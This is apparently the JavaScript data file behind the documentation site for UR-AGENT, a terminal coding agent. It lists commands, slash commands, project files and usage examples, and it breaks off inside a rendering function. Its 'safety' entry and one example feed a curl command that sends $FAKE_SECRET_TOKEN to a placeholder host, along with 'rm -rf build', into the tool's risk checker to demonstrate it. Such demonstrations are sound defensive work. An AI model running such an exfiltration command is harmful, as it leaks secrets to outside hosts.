const featureGroups = [
  {
    title: 'Core agent runtime',
    tags: ['interactive', 'headless', 'models'],
    text: 'Interactive terminal sessions, one-shot print mode, JSON and stream-json output, resumable conversations, custom agents, model routing, local runtimes, and legal provider adapters.',
    commands: ['ur', 'ur -p', 'ur --resume', 'ur --continue', 'ur --model <model>', 'ur provider'],
  },
  {
    title: 'Project context',
    tags: ['UR.md', 'AGENTS.md', '.ur', 'manifest'],
    text: 'Repository instructions, project settings, custom agents, skills, memory, knowledge sources, architecture manifests, verification gates, workflows, evals, and local state.',
    commands: ['UR.md', 'AGENTS.md', 'ur context-pack', '.ur/project-manifest.json', '.ur/context'],
  },
  {
    title: 'Agent platform',
    tags: ['spec', 'workflow', 'pattern', 'crew', 'goal', 'worktree'],
    text: 'Spec-driven development, durable workflows, collaboration patterns, parallel crews, long-horizon goals, live execution boards, and resumable checkpoint state.',
    commands: ['ur spec', 'ur workflow', 'ur pattern', 'ur crew', 'ur goal', 'ur worktree'],
  },
  {
    title: 'Judging, escalation, and repair',
    tags: ['oracle', 'arena', 'CI', 'artifacts'],
    text: 'Capability-aware fast/oracle model routing, best-of-N agent judging, test-first execution loops, self-healing CI loops, and reviewable artifacts for diffs, test runs, plans, and feedback.',
    commands: ['ur escalate', 'ur arena', 'ur test-first', 'ur ci-loop', 'ur artifacts', 'ur bg'],
  },
  {
    title: 'Reliable repo editing',
    tags: ['index', 'AST', 'preview', 'rollback'],
    text: 'File and symbol indexing, indexed search, AST-aware JavaScript/TypeScript identifier rename plans, patch previews before writes, and rollback-safe multi-file apply.',
    commands: ['ur repo-edit index', 'ur repo-edit search', 'ur repo-edit preview rename', 'ur repo-edit apply rename --check'],
  },
  {
    title: 'Automation and triggers',
    tags: ['cron', 'daemon', 'webhooks'],
    text: 'Project-local automation specs, resident scheduler installation, daemon ticks, GitHub or Slack mention parsing, and headless trigger dispatch.',
    commands: ['ur automation', 'ur trigger'],
  },
  {
    title: 'Knowledge and memory',
    tags: ['retrieval', 'provenance', 'citations'],
    text: 'Durable memory, semantic memory, curated knowledge sources, lexical or embedding retrieval, citations, claim ledgers, and research graph primitives.',
    commands: ['ur knowledge', 'ur semantic-memory', 'ur context-pack remember', 'ur claim-ledger'],
  },
  {
    title: 'Evaluation and verification',
    tags: ['evals', 'review', 'QA'],
    text: 'Replayable eval suites, self-review PR gate, browser QA fixtures, verifier reminders, test-first traces, trace inspection, reviewable artifacts, and subagent timelines.',
    commands: ['ur eval', 'ur test-first', 'ur agent-task', 'ur browser-qa', 'ur artifacts', '/verify', '/trace'],
  },
  {
    title: 'Interoperability',
    tags: ['MCP', 'plugins', 'A2A', 'SDK'],
    text: 'MCP servers, plugin marketplaces for skills, templates, validators, language adapters, A2A Agent Card and task server, delegation tokens, and a TypeScript SDK wrapper around headless UR.',
    commands: ['ur mcp', 'ur plugin', 'ur a2a', 'ur sdk'],
  },
  {
    title: 'Providers and auth',
    tags: ['subscription', 'API', 'local', 'status bar'],
    text: 'UR-native API/local/OpenAI-compatible runtimes, first-class subscription CLI providers dispatched through the official vendor CLIs, provider doctor checks, secure API-key connect, non-secret config, fallback hints, and provider-aware status-bar output.',
    commands: ['ur provider list', 'ur provider status', 'ur provider doctor agy', 'ur connect status', 'ur config set provider openai-api', 'ur config set provider ollama'],
  },
  {
    title: 'Security and operations',
    tags: ['sandbox', 'scope', 'diagnostics', 'policy'],
    text: 'Permission modes, project safety policy, allow/deny tool lists, optional OS sandboxing, diagnostic commands, security scope, threat modeling, hardening, and vulnerability checks.',
    commands: ['ur safety', 'ur doctor', '/sandbox', '/scope', '/security', '/vuln'],
  },
];

const commands = [
  {
    name: 'ur',
    category: 'Core',
    aliases: [],
    summary: 'Start an interactive UR-AGENT session in the current workspace.',
    examples: ['ur', 'ur --model qwen3-coder:480b-cloud', 'ur --continue', 'ur --resume'],
  },
  {
    name: 'ur -p',
    category: 'Core',
    aliases: ['--print'],
    summary: 'Run one prompt headlessly and exit. This is the base mode for scripts, CI, evals, triggers, SDK calls, and A2A tasks.',
    examples: ['ur -p "Summarize this repository"', 'ur -p --output-format json "Review the current diff"', 'ur -p --json-schema \'{"type":"object"}\' "Return structured output"'],
  },
  {
    name: 'acp',
    category: 'Interop',
    aliases: [],
    summary: 'Agent Communication Protocol server for IDE extensions: serve, stop, and status.',
    examples: ['ur acp serve --port 8123', 'ur acp status --json', 'ur acp stop'],
  },
  {
    name: 'a2a',
    category: 'Interop',
    aliases: [],
    summary: 'A2A interoperability utilities: Agent Card, local task server, and delegation tokens.',
    examples: ['ur a2a card', 'ur a2a serve --dry-run', 'ur a2a token mint --secret "$UR_A2A_DELEGATION_SECRET" --scope coding,review'],
  },
  {
    name: 'bg',
    category: 'Agent Platform',
    aliases: ['background-agent'],
    summary: 'Run and manage detached local background agents with optional worktrees and PR creation.',
    examples: ['ur bg run "fix the flaky parser test" --worktree', 'ur bg list --json', 'ur bg status <id> --json'],
  },
  {
    name: 'worktree',
    category: 'Agent Platform',
    aliases: ['worktrees'],
    summary: 'List, inspect, and clean up UR agent worktrees created by background runs.',
    examples: ['ur worktree list', 'ur worktree status <id>', 'ur worktree clean --dry-run'],
  },
  {
    name: 'agent-features',
    category: 'Agent Platform',
    aliases: ['agent-roadmap'],
    summary: 'Show or initialize UR agent feature expansion scaffolds.',
    examples: ['ur agent-features', 'ur agent-features --json', 'ur agent-features init --force'],
  },
  {
    name: 'agent-inspect',
    category: 'Verification',
    aliases: ['inspect-agents'],
    summary: 'Reconstruct per-subagent timelines, verdicts, and failures from a session transcript.',
    examples: ['ur agent-inspect --file session.jsonl', 'ur agent-inspect --file session.json --json'],
  },
  {
    name: 'agent-task',
    category: 'Delivery',
    aliases: ['task-pr'],
    summary: 'Summarize task state, diff status, and PR handoff commands with a deterministic pre-PR self-review gate.',
    examples: ['ur agent-task status', 'ur agent-task diff', 'ur agent-task pr --create --dry-run', 'ur agent-task pr --create --force'],
  },
  {
    name: 'agent-templates',
    category: 'Agent Platform',
    aliases: ['agent-template'],
    summary: 'List or install reusable project agent templates such as reviewer, test-runner, security-auditor, debug-v2, refactor, paper-implementation, benchmark, security-review, dockerize, and latex-paper.',
    examples: ['ur agent-templates list', 'ur agent-templates install reviewer test-runner', 'ur agent-templates install debug-v2 refactor --force'],
  },
  {
    name: 'agent-trends',
    category: 'Agent Platform',
    aliases: ['trends'],
    summary: 'Show UR coverage against modern agent trends: workflows, memory, A2A, MCP, evals, security, browser use, and more.',
    examples: ['ur agent-trends', 'ur agent-trends --json'],
  },
  {
    name: 'agents',
    category: 'Core',
    aliases: [],
    summary: 'List configured agents and project agents available to sessions.',
    examples: ['ur agents', 'ur --agents \'{"reviewer":{"description":"Reviews code","prompt":"Review carefully"}}\''],
  },
  {
    name: 'arena',
    category: 'Agent Platform',
    aliases: ['best-of'],
    summary: 'Run multiple agents on the same task in isolated worktrees, score their diffs, and optionally apply the winning patch.',
    examples: ['ur arena "implement a debounce helper" --agents 2 --dry-run', 'ur arena "implement the rate limiter" --agents 3', 'ur arena "fix the parser" --agents 3 --apply'],
  },
  {
    name: 'artifacts',
    category: 'Evidence',
    aliases: ['artifact'],
    summary: 'Record reviewable deliverables under `.ur/artifacts` with pending, approved, rejected, and feedback states.',
    examples: ['ur artifacts list', 'ur artifacts capture-diff', 'ur artifacts capture-tests --command "bun test"', 'ur artifacts approve 1', 'ur artifacts reject 1 --feedback "Needs a failing test first"'],
  },
  {
    name: 'auth',
    category: 'Ops',
    aliases: [],
    summary: 'Launch optional external app bridge login flows only when those bridge diagnostics are explicitly enabled.',
    examples: ['ur auth chatgpt', 'ur auth claude', 'ur auth gemini', 'ur auth antigravity'],
  },
  {
    name: 'automation',
    category: 'Automation',
    aliases: ['automations'],
    summary: 'Manage project-local automation specs and the resident scheduler.',
    examples: ['ur automation create nightly --schedule "0 9 * * 1-5" --prompt "Review open tasks"', 'ur automation run-due --dry-run', 'ur automation install --platform launchd --interval 300', 'ur automation daemon --once --dry-run'],
  },
  {
    name: 'browser-qa',
    category: 'Verification',
    aliases: [],
    summary: 'Validate and smoke-run browser replay fixtures under `.ur/browser-qa`.',
    examples: ['ur browser-qa list', 'ur browser-qa validate', 'ur browser-qa run home-page-smoke --dry-run'],
  },
  {
    name: 'ci-loop',
    category: 'Automation',
    aliases: ['heal'],
    summary: 'Run a build or test command, summarize failures, invoke a fix agent, and rerun with a bounded retry budget.',
    examples: ['ur ci-loop --command "bun test" --dry-run', 'ur ci-loop --command "bun test" --max-attempts 3', 'ur ci-loop --from-log failure.log --dry-run', 'ur ci-loop --command "bun test" --commit'],
  },
  {
    name: 'context-pack',
    category: 'Knowledge',
    aliases: ['project-manifest', 'ctx-pack'],
    summary: 'Summarize repository architecture from manifests and instructions, record task memory, and compress old context under `.ur/context`.',
    examples: ['ur context-pack scan', 'ur context-pack remember --decision "Use package scripts first"', 'ur context-pack remember --command "bun run typecheck"', 'ur context-pack compress'],
  },
  {
    name: 'config',
    category: 'Ops',
    aliases: ['settings'],
    summary: 'Open the config panel or persist safe non-secret provider settings.',
    examples: ['ur config', 'ur config set provider ollama', 'ur config set provider openai-api', 'ur config set provider anthropic-api', 'ur config set model qwen3-coder:480b-cloud', 'ur config set base_url http://localhost:11434/v1', 'ur config set provider.fallback ollama'],
  },
  {
    name: 'test-first',
    category: 'Verification',
    aliases: ['quality-loop', 'tf-loop'],
    summary: 'Detect the project stack, run compile/test/lint commands, store failure traces, and install edit-time verify gates.',
    examples: ['ur test-first detect', 'ur test-first --dry-run', 'ur test-first --max-attempts 3', 'ur test-first install'],
  },
  {
    name: 'claim-ledger',
    category: 'Evidence',
    aliases: ['claims'],
    summary: 'Manage project claim-to-source provenance records for web, file, MCP, tool, and user evidence.',
    examples: ['ur claim-ledger add --claim "The API supports JSON" --source file:docs/API.md --confidence high', 'ur claim-ledger list', 'ur claim-ledger validate'],
  },
  {
    name: 'code-index',
    category: 'Knowledge',
    aliases: ['codeindex'],
    summary: 'Build and query a local semantic code index using embeddings through the local Ollama app.',
    examples: ['ur code-index build', 'ur code-index search "where is auth handled"', 'UR_CODE_INDEX=1 ur'],
  },
  {
    name: 'crew',
    category: 'Agent Platform',
    aliases: ['crews'],
    summary: 'Create a headless lead/worker task board where worker subagents claim and complete subtasks.',
    examples: ['ur crew create docs --goal "Document every command"', 'ur crew add docs --task "Write examples for workflow"', 'ur crew run docs --workers 3 --dry-run', 'ur crew reset docs'],
  },
  {
    name: 'doctor',
    category: 'Ops',
    aliases: [],
    summary: 'Check health of the installation and configured environment.',
    examples: ['ur doctor', 'ur ur-doctor', 'ur model-doctor'],
  },
  {
    name: 'escalate',
    category: 'Models',
    aliases: [],
    summary: 'Plan, run, or consult a capability-aware fast/oracle model path for hard reasoning, debugging, review, and refactor tasks.',
    examples: ['ur escalate plan "debug the scheduler race"', 'ur escalate run "refactor the cache layer" --force-oracle --dry-run', 'ur escalate oracle "is this lock-free queue correct?"', 'ur escalate policy --fast qwen2.5-coder --oracle qwen3-coder:480b-cloud'],
  },
  {
    name: 'eval',
    category: 'Verification',
    aliases: ['evals'],
    summary: 'Create, validate, run, and report public agent eval suites with deterministic grading plus execution metrics and a local HTML dashboard.',
    examples: ['ur eval init', 'ur eval list', 'ur eval validate starter', 'ur eval run starter --dry-run', 'ur eval run starter --metrics --json', 'ur eval report starter --dashboard', 'ur eval dashboard'],
  },
  {
    name: 'goal',
    category: 'Agent Platform',
    aliases: ['goals'],
    summary: 'Track persistent long-horizon objectives with notes, linked workflows, and resumable execution.',
    examples: ['ur goal add release-docs --objective "Ship professional docs" --workflow docs', 'ur goal note release-docs --note "Command reference drafted"', 'ur goal resume release-docs --dry-run', 'ur goal done release-docs'],
  },
  {
    name: 'update',
    category: 'Ops',
    aliases: ['upgrade'],
    summary: 'Check npm for UR-AGENT updates.',
    examples: ['ur update', 'ur upgrade'],
  },
  {
    name: 'connect',
    category: 'Providers',
    aliases: [],
    summary: 'Connect a provider account: subscription login through the official CLI, or store an API key in the OS keychain.',
    examples: ['ur connect status', 'ur connect codex-cli', 'ur connect openai-api --key <KEY>', 'ur connect logout openai-api'],
  },
  {
    name: 'ide',
    category: 'Interop',
    aliases: [],
    summary: 'Manage IDE integrations: status, doctor, per-editor config, and inline diff bundles under .ur/ide/diffs.',
    examples: ['ur ide status', 'ur ide doctor', 'ur ide config zed', 'ur ide diff capture --title "Parser fix"', 'ur ide diff list'],
  },
  {
    name: 'skill',
    category: 'Automation',
    aliases: ['skills'],
    summary: 'Executable skill workflows: list, show, run, and scaffold project skills.',
    examples: ['ur skill list', 'ur skill init security-review', 'ur skill run security-review "src/auth.ts"'],
  },
  {
    name: 'task',
    category: 'Agents',
    aliases: ['taskctl'],
    summary: 'Start, run, and hand off worktree-per-task sessions with optional PR creation.',
    examples: ['ur task list', 'ur task start parser-fix --worktree', 'ur task pr parser-fix --create --dry-run'],
  },
  {
    name: 'sandbox',
    category: 'Safety',
    aliases: ['sandboxctl'],
    summary: 'Inspect and manage the sandbox/permission architecture: status, dependency check, policy init, and command approval levels.',
    examples: ['ur sandbox status', 'ur sandbox check', 'ur sandbox init'],
  },
  {
    name: 'memory',
    category: 'Knowledge',
    aliases: [],
    summary: 'Manage UR memory, including local retention policies by TTL, max entries, and decay.',
    examples: ['ur memory retention show', 'ur memory retention set --ttl-days 30 --max-entries 500', 'ur memory retention prune'],
  },
  {
    name: 'local-first',
    category: 'Ops',
    aliases: ['local', 'offline-readiness'],
    summary: 'Show UR readiness for no-cloud, private, lab, offline, and edge/server environments.',
    examples: ['ur local-first', 'ur local-first --json'],
  },
  {
    name: 'knowledge',
    category: 'Knowledge',
    aliases: ['kb'],
    summary: 'Curated project knowledge base with file, directory, and note sources plus lexical or embedding search.',
    examples: ['ur knowledge add docs --label docs', 'ur knowledge add --note "Release requires bundle and smoke"', 'ur knowledge build --embeddings', 'ur knowledge search "release checks"'],
  },
  {
    name: 'mcp',
    category: 'Interop',
    aliases: [],
    summary: 'Configure and manage Model Context Protocol servers.',
    examples: ['ur mcp list', 'ur mcp get filesystem', 'ur mcp add-json local-tools \'{"command":"node","args":["server.js"]}\'', 'ur mcp remove local-tools'],
  },
  {
    name: 'model-doctor',
    category: 'Models',
    aliases: ['model-capabilities'],
    summary: 'Inspect local Ollama models, context lengths, and likely capabilities such as coding, vision, tools, and embeddings.',
    examples: ['ur model-doctor', 'ur model-doctor qwen3-coder:480b-cloud', 'ur model-doctor --json'],
  },
  {
    name: 'model-route',
    category: 'Models',
    aliases: ['model-pick'],
    summary: 'Recommend the best local Ollama model for a task by capability fit.',
    examples: ['ur model-route "Fix a failing TypeScript test"', 'ur model-route "Analyze this screenshot UI bug" --json'],
  },
  {
    name: 'pattern',
    category: 'Agent Platform',
    aliases: ['patterns'],
    summary: 'List, inspect, install, save, or execute multi-agent collaboration patterns such as PEER, DOE, concurrent, handoff, and debate.',
    examples: ['ur pattern list', 'ur pattern show peer', 'ur pattern run peer "Implement and review auth"', 'ur pattern run concurrent "Audit docs" --execute --dry-run'],
  },
  {
    name: 'plugin',
    category: 'Interop',
    aliases: ['plugins'],
    summary: 'Manage UR plugins and marketplaces for MCP tools, skills, templates, validators, language adapters, LSP servers, agents, hooks, output styles, and commands.',
    examples: ['ur plugin list', 'ur plugin install hello@ur-plugins-official', 'ur plugin install engineering-discipline@ur-plugins-official', 'ur plugin update <plugin>', 'ur plugin disable <plugin>'],
  },
  {
    name: 'provider',
    category: 'Models',
    aliases: ['providers'],
    summary: 'List, inspect, and diagnose legal model provider adapters without reading hidden credential files.',
    examples: ['ur provider list', 'ur provider status', 'ur provider doctor', 'ur provider doctor ollama', 'ur provider doctor ollama --json'],
  },
  {
    name: 'repo-edit',
    category: 'Delivery',
    aliases: ['repoedit', 'reliable-edit'],
    summary: 'Reliable repo editing with a local file/symbol index, AST-aware JS/TS rename plans, patch previews, and rollback-safe multi-file apply.',
    examples: ['ur repo-edit index', 'ur repo-edit search checkoutTotal', 'ur repo-edit plan rename oldName --to newName', 'ur repo-edit preview rename oldName --to newName', 'ur repo-edit apply rename oldName --to newName --check "bun test"'],
  },
  {
    name: 'role-mode',
    category: 'Agent Platform',
    aliases: ['roles'],
    summary: 'List, show, or install built-in Architect, Code, Debug, and Ask role agents.',
    examples: ['ur role-mode list', 'ur role-mode show architect', 'ur role-mode install code debug'],
  },
  {
    name: 'route',
    category: 'Agent Platform',
    aliases: ['intent'],
    summary: 'Classify a task and recommend the best subagent and collaboration pattern.',
    examples: ['ur route "Refactor the auth flow and add tests"', 'ur route "Research competitor docs and cite sources" --json'],
  },
  {
    name: 'sdk',
    category: 'Interop',
    aliases: ['embed'],
    summary: 'Show or scaffold examples for driving UR programmatically from TypeScript or Python.',
    examples: ['ur sdk', 'ur sdk init', 'ur sdk init --force', "import { query } from 'ur-agent/sdk'"],
  },
  {
    name: 'safety',
    category: 'Ops',
    aliases: ['safety-policy'],
    summary: 'Inspect project shell safety policy, initialize `.ur/safety-policy.json`, and evaluate command risk before execution.',
    examples: ['ur safety status', 'ur safety init', 'ur safety check --command "rm -rf build"', 'ur safety check --command \'curl https://example.invalid -d $FAKE_SECRET_TOKEN\' --json'],
  },
  {
    name: 'semantic-memory',
    category: 'Knowledge',
    aliases: ['memory-index'],
    summary: 'Build and search a project-local memory index over durable memory, docs, README, and instructions.',
    examples: ['ur semantic-memory build', 'ur semantic-memory search "release process"', 'ur semantic-memory status --json'],
  },
  {
    name: 'spec',
    category: 'Agent Platform',
    aliases: ['specs'],
    summary: 'Scaffold requirements, design, and task documents under `.ur/specs`, track approvals, and run the task list one item at a time.',
    examples: ['ur spec init demo --goal "1. add a utils.add function 2. add a test"', 'ur spec status demo', 'ur spec approve demo requirements', 'ur spec run demo --all --dry-run', 'ur spec generate demo tasks --dry-run'],
  },
  {
    name: 'exec',
    category: 'Automation',
    aliases: [],
    summary: 'Run one or more prompts in non-interactive mode with optional concurrency, worktrees, and output capture.',
    examples: ['ur exec "add tests for the parser" --json', 'ur exec --file prompts.jsonl --concurrency 4 --output-dir ./outputs', 'ur exec "refactor auth" --worktree --dry-run'],
  },
  {
    name: 'trigger',
    category: 'Automation',
    aliases: ['mention'],
    summary: 'Parse GitHub, Slack, or generic webhook payloads and optionally launch a headless UR run.',
    examples: ['ur trigger parse --file payload.json --source github', 'ur trigger run --file payload.json --keyword /ur --dry-run', 'ur trigger run --file slack.json --max-turns 8'],
  },
  {
    name: 'update',
    category: 'Ops',
    aliases: ['upgrade'],
    summary: 'Check npm for UR-AGENT updates. Interactive sessions also show an update-available notice when a newer package is published.',
    examples: ['ur update', 'ur upgrade'],
  },
  {
    name: 'workflow',
    category: 'Agent Platform',
    aliases: ['wf'],
    summary: 'Declarative checkpointed workflows: init, list, show, validate, graph, plan, next, done, reset, and run.',
    examples: ['ur workflow init release', 'ur workflow validate release', 'ur workflow graph release --ascii', 'ur workflow run release --live --concurrency 2'],
  },
];

const slashGroups = [
  {
    title: 'Session control',
    items: ['/help', '/clear', '/compact', '/context', '/cost', '/status', '/resume', '/rename', '/exit'],
    text: 'Inspect and manage the current interactive session, conversation history, context usage, and session metadata.',
  },
  {
    title: 'Editing and delivery',
    items: ['/diff', '/repo-edit', '/commit', '/commit-push-pr', '/review', '/verify', '/trace', '/agent-task', '/artifacts'],
    text: 'Review changes, create commits, prepare PRs, inspect the trace, and run verification.',
  },
  {
    title: 'Project intelligence',
    items: ['/dna', '/project', '/context-pack', '/workspace', '/read', '/search', '/index', '/analyze', '/summarize'],
    text: 'Understand the workspace, build indexes, and read or summarize project files.',
  },
  {
    title: 'Agents and orchestration',
    items: ['/agents', '/agent-templates', '/spec', '/workflow', '/pattern', '/crew', '/goal', '/arena', '/route', '/role-mode', '/bg'],
    text: 'Manage agents, install role modes, run specs and workflows, and coordinate multi-agent work.',
  },
  {
    title: 'Agent skills',
    items: ['/debug-v2', '/refactor', '/paper-implementation', '/benchmark', '/security-review', '/dockerize', '/latex-paper', '/simplify', '/debug'],
    text: 'Bundled slash skills that dispatch focused agent work in isolated git worktrees with clean commits and PR output.',
  },
  {
    title: 'Memory and evidence',
    items: ['/memory', '/remember', '/forget', '/knowledge', '/semantic-memory', '/claim-ledger', '/evidence', '/graph'],
    text: 'Persist useful facts, search memory and knowledge, and keep claim provenance.',
  },
  {
    title: 'Automation and evals',
    items: ['/automation', '/trigger', '/ci-loop', '/eval', '/browser-qa', '/actions', '/stability'],
    text: 'Run recurring prompts, webhook-triggered runs, self-healing CI loops, browser smoke checks, evals, and stability diagnostics.',
  },
  {
    title: 'Models, tools, and interop',
    items: ['/model', '/model-doctor', '/model-route', '/escalate', '/mcp', '/plugin', '/skills', '/sdk', '/a2a-card'],
    text: 'Pick models, inspect capabilities, escalate to oracle models, manage MCP/plugin extensions, and expose interop surfaces.',
  },
  {
    title: 'Security operations',
    items: ['/safety', '/security', '/scope', '/threat-model', '/compliance', '/lab', '/playbook', '/kali', '/harden', '/vuln', '/ir'],
    text: 'Read-only security workflows, test scope definition, threat modeling, hardening, vulnerability checks, and incident response.',
  },
  {
    title: 'Media and research',
    items: ['/research', '/paper', '/cite', '/image', '/video', '/youtube', '/browser', '/chrome'],
    text: 'Handle research notes, citations, multimodal files, browser workflows, and video metadata/transcripts.',
  },
  {
    title: 'Preferences and environment',
    items: ['/config', '/permissions', '/sandbox', '/mode', '/theme', '/vim', '/terminal-setup', '/usage', '/ide'],
    text: 'Configure permissions, sandboxing, UI preferences, IDE integration, and runtime environment details.',
  },
];

const projectFiles = [
  {
    title: 'UR.md',
    text: 'Shared project instructions loaded as runtime context. Commit it when it describes team-wide behavior.',
    example: 'touch UR.md',
  },
  {
    title: 'AGENTS.md',
    text: 'Cross-tool agent instructions loaded before UR.md for compatibility with other coding-agent tools.',
    example: 'touch AGENTS.md',
  },
  {
    title: 'UR.local.md',
    text: 'Private local instructions. Keep it out of Git.',
    example: 'echo "Prefer concise answers" > UR.local.md',
  },
  {
    title: '.ur/agents/',
    text: 'Project agent definitions installed by agent templates or role modes.',
    example: 'ur agent-templates install reviewer test-runner',
  },
  {
    title: '.ur/workflows/',
    text: 'Workflow YAML specs and checkpoint state for `ur workflow` and goal resumes.',
    example: 'ur workflow init release',
  },
  {
    title: '.ur/specs/',
    text: 'Spec-driven requirements, design, task lists, phase state, and approvals for `ur spec`.',
    example: 'ur spec init demo --goal "1. add a helper 2. add a test"',
  },
  {
    title: '.ur/automations/',
    text: 'Cron-like automation specs for project-local scheduled headless prompts.',
    example: 'ur automation create nightly --schedule "0 9 * * 1-5" --prompt "Review tasks"',
  },
  {
    title: '.ur/evals/',
    text: 'Replayable eval suites and saved reports.',
    example: 'ur eval init && ur eval run starter --dry-run',
  },
  {
    title: '.ur/knowledge/',
    text: 'Curated knowledge sources and indexes with provenance.',
    example: 'ur knowledge add docs && ur knowledge build',
  },
  {
    title: '.ur/evidence/',
    text: 'Claim provenance ledger and evidence files.',
    example: 'ur claim-ledger validate',
  },
  {
    title: '.ur/artifacts/',
    text: 'Reviewable plans, diffs, test runs, screenshots, notes, approvals, rejections, and feedback.',
    example: 'ur artifacts capture-diff',
  },
  {
    title: '.ur/runs/',
    text: 'Research-grade run traces with plan, actions, diff, tests, and report files for auditable agent runs.',
    example: '/trace',
  },
  {
    title: '.ur/hooks.json',
    text: 'Project lifecycle hooks for BeforeEdit, AfterEdit, BeforeCommand, AfterCommand, BeforeCommit, and OnFailure.',
    example: '/hooks',
  },
  {
    title: '.ur/ide/diffs/',
    text: 'Editor-readable inline diff bundles consumed by the bundled VS Code review extension.',
    example: 'ur ide diff capture --title "Parser fix"',
  },
  {
    title: '.ur/safety-policy.json',
    text: 'Project shell safety policy for read/write/execute/network classes, destructive-command approval, sandbox posture, and secret exfiltration denial.',
    example: 'ur safety init',
  },
  {
    title: '.ur/project-manifest.json',
    text: 'Manifest-backed architecture context from Project DNA, package scripts, instruction files, verify gates, and safety config.',
    example: 'ur context-pack scan',
  },
  {
    title: '.ur/context/',
    text: 'Architecture summaries, task memory JSONL, and compressed context for decisions, constraints, commands, diffs, and notes.',
    example: 'ur context-pack compress',
  },
  {
    title: '.ur/repo-edit/',
    text: 'Reliable repo-edit index data with file metadata, tokens, and JavaScript/TypeScript symbols.',
    example: 'ur repo-edit index',
  },
  {
    title: '.ur/code-index/',
    text: 'Semantic repo index files for files, symbols, imports, callers, tests, docs, and configs.',
    example: 'ur code-index repo build',
  },
  {
    title: '.ur/test-first/',
    text: 'Failure traces from stack-aware compile/test/lint loops.',
    example: 'ur test-first --max-attempts 1',
  },
  {
    title: '.ur/browser-qa/',
    text: 'Browser replay fixtures and smoke-test targets.',
    example: 'ur browser-qa validate',
  },
];

const examples = [
  {
    title: 'Interactive coding session',
    text: 'Start in the repository root and let UR discover project context.',
    code: 'ur\n# then ask: "Find the bug in the failing checkout test and fix it."',
  },
  {
    title: 'Headless JSON run',
    text: 'Use for scripts or CI jobs that need machine-readable output.',
    code: 'ur -p --output-format json "Return the release checklist for this repo"',
  },
  {
    title: 'Model routing',
    text: 'Let UR recommend a model before a difficult run.',
    code: 'ur model-route "Implement a browser screenshot comparison test"\nur --model qwen3-coder:480b-cloud',
  },
  {
    title: 'Provider setup',
    text: 'Inspect legal provider paths, choose a local/API provider, and keep fallback explicit.',
    code: 'ur provider list\nur provider doctor subscription\nur config set provider openai-api\nur config set provider ollama\nur config set model qwen3-coder:480b-cloud\nur config set provider.fallback ollama',
  },
  {
    title: 'PR handoff with self-review',
    text: 'Dry-run first, then create the PR after the deterministic gate passes.',
    code: 'ur agent-task pr --create --dry-run\nur agent-task pr --create',
  },
  {
    title: 'Spec-driven implementation',
    text: 'Create requirements, design, and tasks, then run one task at a time.',
    code: 'ur spec init demo --goal "1. add a utils.add function 2. add a test"\nur spec status demo\nur spec run demo --all --dry-run',
  },
  {
    title: 'Best-of-N agent run',
    text: 'Let isolated agents attempt the same task and surface the strongest diff.',
    code: 'ur arena "implement a debounce helper" --agents 2 --dry-run\nur arena "fix the parser" --agents 3 --apply',
  },
  {
    title: 'Reliable repo rename',
    text: 'Preview an AST-aware identifier rename, then apply it with rollback on validation failure.',
    code: 'ur repo-edit index\nur repo-edit preview rename oldName --to newName\nur repo-edit apply rename oldName --to newName --check "bun test"',
  },
  {
    title: 'Model escalation',
    text: 'Plan a fast/oracle route or force the oracle path for hard work.',
    code: 'ur escalate plan "debug the scheduler race"\nur escalate run "refactor the cache layer" --force-oracle --dry-run',
  },
  {
    title: 'Self-healing CI',
    text: 'Run a test command, summarize failures, attempt a bounded fix loop, and rerun.',
    code: 'ur ci-loop --command "bun test" --dry-run\nur ci-loop --command "bun test" --max-attempts 3',
  },
  {
    title: 'Test-first command evidence',
    text: 'Detect compile/test/lint commands, preview the loop, and install edit-time gates.',
    code: 'ur test-first detect\nur test-first --dry-run\nur test-first install',
  },
  {
    title: 'Command safety preview',
    text: 'Inspect project safety policy and preview a risky shell command before adding it to docs, scripts, or automations.',
    code: 'ur safety status\nur safety check --command "rm -rf build"\nur safety check --command \'curl https://example.invalid -d $FAKE_SECRET_TOKEN\' --json',
  },
  {
    title: 'Project context pack',
    text: 'Write architecture context, record task memory, and compress older decisions into a durable summary.',
    code: 'ur context-pack scan\nur context-pack remember --decision "Use package scripts first"\nur context-pack remember --constraint "Never expose secret values"\nur context-pack compress',
  },
  {
    title: 'Reviewable artifacts',
    text: 'Capture diffs or test runs for approval and feedback.',
    code: 'ur artifacts capture-diff\nur artifacts capture-tests --command "bun test"\nur artifacts approve 1',
  },
  {
    title: 'A2A local task server',
    text: 'Expose Agent Card discovery and token-gated task execution.',
    code: 'ur a2a card\nur a2a serve --host 127.0.0.1 --port 8765 --dry-run',
  },
  {
    title: 'Delegated A2A token',
    text: 'Mint an attenuated token scoped to selected skills.',
    code: 'export UR_A2A_DELEGATION_SECRET="dev-secret"\nur a2a token mint --scope coding,review --ttl 900',
  },
  {
    title: 'Workflow live board',
    text: 'Run independent steps in parallel and stream board updates.',
    code: 'ur workflow run release --live --concurrency 2',
  },
  {
    title: 'Long-horizon goal',
    text: 'Track progress and resume the linked workflow later.',
    code: 'ur goal add docs --objective "Ship complete docs" --workflow release\nur goal note docs --note "Quickstart complete"\nur goal resume docs --dry-run',
  },
  {
    title: 'Webhook trigger dry-run',
    text: 'Check a GitHub or Slack payload before launching the agent.',
    code: 'ur trigger parse --file payload.json --source github --keyword /ur\nur trigger run --file payload.json --dry-run',
  },
  {
    title: 'SDK TypeScript',
    text: 'Drive UR from another Node program.',
    code: "import { query } from 'ur-agent/sdk'\n\nconst result = await query('Review the current git diff', { maxTurns: 6 })\nconsole.log(result.text)",
  },
  {
    title: 'Eval suite',
    text: 'Create a suite, validate, run offline with metrics, then open the dashboard.',
    code: 'ur eval init\nur eval validate starter\nur eval run starter --dry-run\nur eval run starter --metrics\nur eval report starter --dashboard',
  },
  {
    title: 'Safe automation',
    text: 'Create and test recurring headless prompts before installing a scheduler.',
    code: 'ur automation create weekly --schedule "0 10 * * 1" --prompt "Review unresolved TODOs"\nur automation run weekly --dry-run\nur automation install --platform launchd --interval 300',
  },
];

function escapeHtml(value) {
  return String(value)
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
    .replaceAll("'", '&#039;');
}

function renderFeatureGrid() {
  const root = document.getElementById('featureGrid');
  root.innerHTML = featureGroups.map(group => `
    <article class="feature-card searchable" data-search="${escapeHtml([group.title, group.text, group.tags.join(' '), group.commands.join(' ')].join(' '))}">
      <div class="tag-row">${group.tags.map(tag => `<span class="tag">${escapeHtml(tag)}</span>`).join('')}</div>
      <h3>${escapeHtml(group.title)}</h3>
      <p>${escapeHtml(group.text)}</p>
